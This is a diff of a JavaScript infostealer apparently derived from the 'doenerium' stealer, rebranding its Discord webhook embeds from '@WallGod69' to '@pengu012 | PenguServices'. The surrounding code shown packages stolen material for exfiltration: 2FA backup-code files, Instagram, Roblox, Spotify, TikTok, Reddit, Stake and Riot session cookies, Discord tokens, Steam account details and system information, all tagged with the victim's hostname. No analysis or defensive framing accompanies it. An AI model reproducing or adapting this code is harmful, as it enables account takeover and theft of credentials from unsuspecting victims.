@@ -461,8 +461,8 @@ async function findBackupCodes() {
               },
               description: `\`\`\`${destinationFilePath}\n\n${fs.readFileSync(destinationFilePath, 'utf-8')}\`\`\``,
               footer: {
-                text: `${user.hostname} | @WallGod69 | discord.gg/doenerium`,
-                icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
+                text: `${user.hostname} | @pengu012 | PenguServices`,
+                icon_url: 'https://cdn.discordapp.com/attachments/1347087633016426549/1347088689947218001/676156d5d900c65d8f9f015b_pengu_Preview_Image_Updated_1.png?ex=67ca8d9b&is=67c93c1b&hm=7eb486aceb929117e407e5b3a1fa85290a085e4f985c0519e0f1b74ab7d86c06&',
               },
             };
 
@@ -514,8 +514,8 @@ async function findEpicGamesBackupCodes() {
               },
               description: `\`\`\`${destinationFilePath}\n\n${fs.readFileSync(destinationFilePath, 'utf-8')}\`\`\``,
               footer: {
-                text: `${user.hostname} | @WallGod69 | discord.gg/doenerium`,
-                icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
+                text: `${user.hostname} | @pengu012 | PenguServices`,
+                icon_url: 'https://cdn.discordapp.com/attachments/1347087633016426549/1347088689947218001/676156d5d900c65d8f9f015b_pengu_Preview_Image_Updated_1.png?ex=67ca8d9b&is=67c93c1b&hm=7eb486aceb929117e407e5b3a1fa85290a085e4f985c0519e0f1b74ab7d86c06&',
               },
             };
 
@@ -566,8 +566,8 @@ async function findGithubBackupCodes() {
               },
               description: `\`\`\`${destinationFilePath}\n\n${fs.readFileSync(destinationFilePath, 'utf-8')}\`\`\``,
               footer: {
-                text: `${user.hostname} | @WallGod69 | discord.gg/doenerium`,
-                icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
+                text: `${user.hostname} | @pengu012 | PenguServices`,
+                icon_url: 'https://cdn.discordapp.com/attachments/1347087633016426549/1347088689947218001/676156d5d900c65d8f9f015b_pengu_Preview_Image_Updated_1.png?ex=67ca8d9b&is=67c93c1b&hm=7eb486aceb929117e407e5b3a1fa85290a085e4f985c0519e0f1b74ab7d86c06&',
               },
             };
 
@@ -1321,7 +1321,7 @@ async function SubmitInstagram(session_id) {
         { name: 'Token', value: '```' + data.session_id + '```', inline: false },
       ],
       footer: {
-        text: `${user.hostname} | @WallGod69 | discord.gg/doenerium`,
+        text: `${user.hostname} | @pengu012 | PenguServices`,
       },
     };
 
@@ -1431,8 +1431,8 @@ async function SubmitRoblox(secret_cookie) {
         },
       ],
       footer: {
-        text: `${user.hostname} | @WallGod69 | discord.gg/doenerium`,
-        icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
+        text: `${user.hostname} | @pengu012 | PenguServices`,
+        icon_url: 'https://cdn.discordapp.com/attachments/1347087633016426549/1347088689947218001/676156d5d900c65d8f9f015b_pengu_Preview_Image_Updated_1.png?ex=67ca8d9b&is=67c93c1b&hm=7eb486aceb929117e407e5b3a1fa85290a085e4f985c0519e0f1b74ab7d86c06&',
       },
     };
 
@@ -1489,8 +1489,8 @@ async function SpotifySession(cookie) {
                 { name: 'Spotify Cookie | sp_dc=', value: '```' + cookie + '```', inline: false }
             ],
             footer: {
-                text: `${user.hostname} | @WallGod69 | discord.gg/doenerium`,
-                icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
+                text: `${user.hostname} | @pengu012 | PenguServices`,
+                icon_url: 'https://cdn.discordapp.com/attachments/1347087633016426549/1347088689947218001/676156d5d900c65d8f9f015b_pengu_Preview_Image_Updated_1.png?ex=67ca8d9b&is=67c93c1b&hm=7eb486aceb929117e407e5b3a1fa85290a085e4f985c0519e0f1b74ab7d86c06&'
             }
         };
 
@@ -1611,8 +1611,8 @@ function stealTikTokSession(cookie) {
                         }
                       ],
                       footer: {
-                        text: `${user.hostname} | @WallGod69 | discord.gg/doenerium`,
-                        icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
+                        text: `${user.hostname} | @pengu012 | PenguServices`,
+                        icon_url: 'https://cdn.discordapp.com/attachments/1347087633016426549/1347088689947218001/676156d5d900c65d8f9f015b_pengu_Preview_Image_Updated_1.png?ex=67ca8d9b&is=67c93c1b&hm=7eb486aceb929117e407e5b3a1fa85290a085e4f985c0519e0f1b74ab7d86c06&',
                       },
                     }
                   ]
@@ -1697,8 +1697,8 @@ function setRedditSession(cookie) {
                 { name: '🚫 Suspended', value: '```' + (suspended ? 'Yes' : 'No') + '```', inline: true }
                             ],
                             footer: {
-                                text: `${user.hostname} | @WallGod69 | discord.gg/doenerium`,
-                                icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
+                                text: `${user.hostname} | @pengu012 | PenguServices`,
+                                icon_url: 'https://cdn.discordapp.com/attachments/1347087633016426549/1347088689947218001/676156d5d900c65d8f9f015b_pengu_Preview_Image_Updated_1.png?ex=67ca8d9b&is=67c93c1b&hm=7eb486aceb929117e407e5b3a1fa85290a085e4f985c0519e0f1b74ab7d86c06&'
                             },
                             author: {
                                 name: "Reddit Session Detected",
@@ -1944,8 +1944,8 @@ async function getTokens() {
                     },
                 ],
                 footer: {
-                    text: `${user.hostname} | @WallGod69 | discord.gg/doenerium`,
-                    icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
+                    text: `${user.hostname} | @pengu012 | PenguServices`,
+                    icon_url: 'https://cdn.discordapp.com/attachments/1347087633016426549/1347088689947218001/676156d5d900c65d8f9f015b_pengu_Preview_Image_Updated_1.png?ex=67ca8d9b&is=67c93c1b&hm=7eb486aceb929117e407e5b3a1fa85290a085e4f985c0519e0f1b74ab7d86c06&'
                 }
             };
 
@@ -1963,7 +1963,7 @@ async function getTokens() {
                         icon_url: "https://images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%3Fsize%3D96%26quality%3Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp"
                     },
                     footer: {
-                        text: `${user.hostname} | @WallGod69 | discord.gg/doenerium`,
+                        text: `${user.hostname} | @pengu012 | PenguServices`,
                     }
                 };
                 data.embeds.push(friendsEmbed);
@@ -2604,8 +2604,8 @@ function createSteamEmbed(account, accountInfo, games, level) {
             }
         ],
         footer: {
-            text: `${user.hostname} | @WallGod69 | discord.gg/doenerium`,
-            icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
+            text: `${user.hostname} | @pengu012 | PenguServices`,
+            icon_url: 'https://cdn.discordapp.com/attachments/1347087633016426549/1347088689947218001/676156d5d900c65d8f9f015b_pengu_Preview_Image_Updated_1.png?ex=67ca8d9b&is=67c93c1b&hm=7eb486aceb929117e407e5b3a1fa85290a085e4f985c0519e0f1b74ab7d86c06&',
         },
     };
 }
@@ -3140,7 +3140,7 @@ try {
         color: 0x303037,
         author: {
             name: `${user.hostname} | System Information | @WallGod69`,
-            icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
+            icon_url: 'https://cdn.discordapp.com/attachments/1347087633016426549/1347088689947218001/676156d5d900c65d8f9f015b_pengu_Preview_Image_Updated_1.png?ex=67ca8d9b&is=67c93c1b&hm=7eb486aceb929117e407e5b3a1fa85290a085e4f985c0519e0f1b74ab7d86c06&',
         },
         fields: [
             {
@@ -3196,8 +3196,8 @@ try {
             },
         ],
         footer: {
-            text: `${user.hostname} | @WallGod69 | discord.gg/doenerium`,
-            icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
+            text: `${user.hostname} | @pengu012 | PenguServices`,
+            icon_url: 'https://cdn.discordapp.com/attachments/1347087633016426549/1347088689947218001/676156d5d900c65d8f9f015b_pengu_Preview_Image_Updated_1.png?ex=67ca8d9b&is=67c93c1b&hm=7eb486aceb929117e407e5b3a1fa85290a085e4f985c0519e0f1b74ab7d86c06&',
         },
     };
 
@@ -3780,7 +3780,7 @@ async function sendKeywordsToDiscord(keywords) {
             "color": 0x303037,
             "footer": {
                 "text": `${user.hostname} | @WallGod69 | discord.gg/doenerium`,
-                "icon_url": 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
+                "icon_url": 'https://cdn.discordapp.com/attachments/1347087633016426549/1347088689947218001/676156d5d900c65d8f9f015b_pengu_Preview_Image_Updated_1.png?ex=67ca8d9b&is=67c93c1b&hm=7eb486aceb929117e407e5b3a1fa85290a085e4f985c0519e0f1b74ab7d86c06&'
             }
         };
 
@@ -3807,7 +3807,7 @@ async function sendStakeSessionToDiscord(decrypted) {
             "color": 0x303037,
             "footer": {
                 "text": `${user.hostname} | @WallGod69 | discord.gg/doenerium`,
-                "icon_url": 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
+                "icon_url": 'https://cdn.discordapp.com/attachments/1347087633016426549/1347088689947218001/676156d5d900c65d8f9f015b_pengu_Preview_Image_Updated_1.png?ex=67ca8d9b&is=67c93c1b&hm=7eb486aceb929117e407e5b3a1fa85290a085e4f985c0519e0f1b74ab7d86c06&'
             },
             "thumbnail": {
                 "url": 'https://cdn.discordapp.com/attachments/1223099035162771528/1283211354144112712/vizimexvux7d1.gif?ex=66e22b33&is=66e0d9b3&hm=7021a54c292b6a767aaa18baebb8c707ea5fa224c366f676abd6e23bd8168df2&'
@@ -3984,7 +3984,7 @@ async function RiotGameSession(cookie) {
             "color": 0x303037,
             "footer": {
                 "text": `${user.hostname} | @WallGod69 | discord.gg/doenerium`,
-                "icon_url": 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
+                "icon_url": 'https://cdn.discordapp.com/attachments/1347087633016426549/1347088689947218001/676156d5d900c65d8f9f015b_pengu_Preview_Image_Updated_1.png?ex=67ca8d9b&is=67c93c1b&hm=7eb486aceb929117e407e5b3a1fa85290a085e4f985c0519e0f1b74ab7d86c06&'
             },
             "thumbnail": { "url": "https://seeklogo.com/images/V/valorant-logo-FAB2CA0E55-seeklogo.com.png" },
             "author": {
